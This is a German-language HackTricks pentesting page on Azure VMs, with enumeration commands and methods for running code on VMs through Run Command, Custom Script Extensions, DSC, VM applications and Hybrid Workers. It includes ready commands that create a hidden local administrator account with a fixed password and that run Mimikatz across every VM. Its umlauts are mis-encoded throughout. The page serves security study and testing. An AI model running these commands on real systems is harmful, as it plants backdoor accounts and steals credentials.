# Az - Virtuelle Maschinen & Netzwerk

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundinformationen

[Aus den Dokumenten:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure-virtuelle Maschinen sind eine von mehreren Arten von [on-demand, skalierbaren Rechenressourcen](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree), die Azure anbietet. Typischerweise w√§hlst du eine virtuelle Maschine, wenn du mehr Kontrolle √ºber die Rechenumgebung ben√∂tigst, als die anderen Optionen bieten. Dieser Artikel gibt dir Informationen dar√ºber, was du beachten solltest, bevor du eine virtuelle Maschine erstellst, wie du sie erstellst und wie du sie verwaltest.

## Azure Netzwerk Informationen

Azure-Netzwerke enthalten **verschiedene Entit√§ten und M√∂glichkeiten, sie zu konfigurieren.** Du findest eine kurze **Beschreibung,** **Beispiele** und **Aufz√§hlungs**befehle der verschiedenen Azure-Netzwerkinstanzen in:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** bietet eine sichere, vollst√§ndig verwaltete RDP (Remote Desktop Protocol) und SSH (Secure Shell) Zugangs-L√∂sung √ºber SSL √ºber das Azure-Portal. Es ist in ein Azure Virtual Network integriert, was RDP- und SSH-Konnektivit√§t zu VMs √ºber private IPs erm√∂glicht und die Notwendigkeit √∂ffentlicher IPs vermeidet. Dies macht es zu einer sichereren, bequemeren Alternative zu traditionellen Methoden, die √∂ffentliche IP-Zuweisungen und NSG-Regelkonfigurationen f√ºr den VM-Zugriff erfordern. Entwickler und IT-Personal k√∂nnen sicher auf VMs √ºber das Azure-Portal mit ihren Webbrowsern zugreifen, was den Prozess f√ºr Entwicklungs- und Testumgebungen optimiert.

Um alle Azure Bastion Hosts in deinem Abonnement aufzulisten, kannst du den folgenden Befehl verwenden:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Aufz√§hlung
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Befehle in einer VM ausf√ºhren**

### **AAD-Anmeldung in der VM**

Es ist m√∂glich, Benutzern, die √ºber AzureAD authentifiziert sind, den Zugriff zu erm√∂glichen. Zum Beispiel beim Versuch, auf eine **Linux-VM** zuzugreifen: `ssh username@azure-corp.com@1.1.1.1` (es ist wichtig, die **E-Mail** mit dem azurecorp zu verwenden, wenn man sich anmelden m√∂chte), k√∂nnte man einen Fehler wie erhalten: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Befolgen Sie einfach **diese Anweisungen**, indem Sie zu [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) gehen und den Code angeben, verwenden Sie die E-Mail und das Passwort als Anmeldeinformationen, und Sie k√∂nnen sich √ºber SSH verbinden (wenn dieser Benutzer √ºber ausreichende Berechtigungen verf√ºgt: `Virtual Machine Administrator Login` oder `Virtual Machine User Login` Rolle).

### **Befehl ausf√ºhren**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **F√ºhren Sie die benutzerdefinierte Skripterweiterung aus**

Azure-virtuelle Maschinen (VM) Erweiterungen sind **kleine Anwendungen**, die Konfigurations- und Automatisierungs-**aufgaben** nach der Bereitstellung auf **Azure VMs** bereitstellen. Wenn beispielsweise eine virtuelle Maschine die Installation von Software, den Schutz durch Antivirenprogramme oder die M√∂glichkeit ben√∂tigt, ein Skript darin auszuf√ºhren, k√∂nnen Sie eine VM-Erweiterung verwenden.

Daher, wenn Sie Zugriff haben, um es zu schreiben, k√∂nnen Sie beliebigen Code ausf√ºhren:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) ist ein PowerShell-Tool, das Ansible √§hnlich ist und zum Einrichten eines Hosts durch Code verwendet wird. DSC integriert sich mit Azure und erm√∂glicht das Hochladen spezifischer Konfigurationsdateien. Diese Dateien m√ºssen einer strengen Syntax entsprechen. Bemerkenswert ist, dass die DSC-Erweiterung in Azure Befehle aus Dateien ausf√ºhren kann, die bestimmten Formatierungskriterien entsprechen, selbst wenn die Syntax nicht den DSC-Standards entspricht, wie in der bereitgestellten Abbildung gezeigt.

Die Ausf√ºhrung dieser Befehle wird durch die [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) Funktion in Az PowerShell erleichtert. Die Anforderungen umfassen eine **.PS1**-Datei mit einer definierten Funktion, und die Datei muss in eine **.zip**-Datei gepackt werden. Obwohl die Syntax m√∂glicherweise nicht korrekt f√ºr DSC ist, wird der Code dennoch ausgef√ºhrt. Die Erweiterung wird jedoch den Ausf√ºhrungsstatus als "Fehler" markieren, und keine Ausgabe des Befehls wird sichtbar sein, da der Status durch die Fehlermeldung √ºberschrieben wird.

### VM Application Definitions

VM Application Definitions erm√∂glichen die wiederholbare Bereitstellung von versionierten Anwendungen auf einer Azure-VM. Diese Ressource unterst√ºtzt die Bereitstellung und Aktualisierung von Anwendungen √ºber VMs hinweg. Um dies einzurichten, sind mehrere Schritte erforderlich, die Befehle wie **`New-AzGalleryApplication`** und **`New-AzGalleryApplicationVersion`** in Az PowerShell beinhalten.

Die Ausf√ºhrung von Anwendungen oder Befehlen √ºber diese Methode erfolgt √ºber die **"VMAppExtension"**, die automatisch installiert wird, wenn eine Anwendung auf eine VM angewendet wird. Die Erweiterung ruft die Datei von der angegebenen URI ab und benennt sie genau wie die Anwendung, ohne eine Erweiterung. Um die Datei korrekt auszuf√ºhren, muss das Feld "ManageActions" im REST-API-Aufruf so konfiguriert werden, dass die Datei mit der entsprechenden Erweiterung umbenannt wird. Die Einrichtung dieser Methode wird, sobald sie abgeschlossen ist, der in der bereitgestellten Abbildung gezeigten Struktur √§hneln.

Diese Methode der Ausf√ºhrung ist jedoch relativ langsam und ben√∂tigt etwa 3-4 Minuten, um eine Anwendung oder einen Befehl auszuf√ºhren. Die mit diesem Prozess verbundenen Dateien werden in spezifischen Verzeichnissen gespeichert (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` f√ºr die Anwendungsdatei und `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` f√ºr den Ausf√ºhrungsstatus).

Beide Techniken bieten einzigartige M√∂glichkeiten zur Ausf√ºhrung von Befehlen und zur Bereitstellung von Anwendungen in Azure-Umgebungen, jede mit ihren eigenen Anforderungen, Schritten und √úberlegungen.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) sind eine Funktion in Azure, die es erm√∂glicht, Runbooks, die in einem Automatisierungskonto konfiguriert sind, auf einer Azure-VM (VM) auszuf√ºhren, die Teil der vorgesehenen HWG ist. Diese Ausf√ºhrung wird durch eine auf der VM installierte Erweiterung erleichtert, die den Runbook-Code auf die VM bereitstellt. Ein wesentlicher Aspekt dieses Prozesses ist, dass die tats√§chlichen Anmeldeinformationen bei der Ausf√ºhrung keine Rolle spielen, da der Code mit erh√∂hten Rechten, speziell als **SYSTEM** oder root, ausgef√ºhrt wird, wie in der bereitgestellten Abbildung veranschaulicht.

Ein wichtiger Punkt f√ºr diejenigen, die Windows 10 VMs nutzen, ist die Notwendigkeit, die PowerShell-Version f√ºr das Runbook anzugeben. Sie sollte so eingestellt werden, dass sie als PowerShell Version 5.1 anstelle von 7.1 ausgef√ºhrt wird. Diese Anforderung ergibt sich aus der Tatsache, dass PowerShell 7.1 standardm√§√üig nicht auf diesen VMs installiert ist, was zu einem Fehler bei der Skriptausf√ºhrung f√ºhrt, wenn Version 7.1 angegeben wird.

Dieses Feature von Azure bietet eine robuste Methode zur Automatisierung und Verwaltung von Aufgaben in hybriden Umgebungen und erm√∂glicht eine zentrale Verwaltung und Ausf√ºhrung von Aufgaben auf Azure-VMs.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
